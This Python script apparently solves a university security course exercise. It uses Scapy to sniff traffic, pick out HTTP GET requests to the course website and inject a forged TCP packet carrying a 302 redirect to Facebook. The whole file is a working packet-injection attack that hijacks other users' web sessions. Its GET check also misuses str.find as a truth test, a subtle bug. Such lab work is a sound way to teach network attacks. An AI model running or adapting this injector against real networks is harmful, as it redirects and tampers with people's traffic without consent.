import q1
import scapy.all as S


RESPONSE = '\r\n'.join([
    r'HTTP/1.1 302 Found',
    r'Location: http://www.facebook.com',
    r'',
    r''])


WEBSITE = 'infosec17.cs.tau.ac.il'
HTTP_PORT = 80

def get_tcp_injection_packet(packet):
    """
    If the given packet is an attempt to access the course website, create a
    IP+TCP packet that will redirect the user to Facebook by sending them the
    `RESPONSE` from above.
    """
    if q1.packet_filter(packet):
        if packet[S.TCP].load.find('GET'):
            ip = packet[S.IP]
            tcp = packet[S.TCP]
            # IP layer of the response packet:
            response = S.IP(dst = ip.src, src = ip.dst)
            # Warpping the IP packet with a TCP layer and setting
            # source port to match the original source port
            # and destination port to be 80 for HTTP.
            # Also sets the TCP flags to Acknowldeged and Finish (FA).
            # Finally we set the sequence number to be the ack number of the packet
            # and the ack number to be the seq number of the packet + the length of the tcp layer.
            response = response / S.TCP(dport = ip.sport, sport = ip.dport, flags = 'FA', seq = tcp.ack, ack = tcp.seq + len(tcp.payload))
            # Appending the load to the packet
            response = response / S.Raw(load = RESPONSE)
            return response 
    return None


def injection_handler(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    to_inject = get_tcp_injection_packet(packet)
    if to_inject:
        S.send(to_inject)
        return 'Injection triggered!'


def packet_filter(packet):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    return q1.packet_filter(packet)


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!

    if '--help' in args or len(args) > 1:
        print 'Usage: %s' % args[0]
        return

    # Allow Scapy to really inject raw packets
    S.conf.L3socket = S.L3RawSocket

    # Now sniff and wait for injection opportunities.
    S.sniff(lfilter=packet_filter, prn=injection_handler)


if __name__ == '__main__':
    import sys
    main(sys.argv)
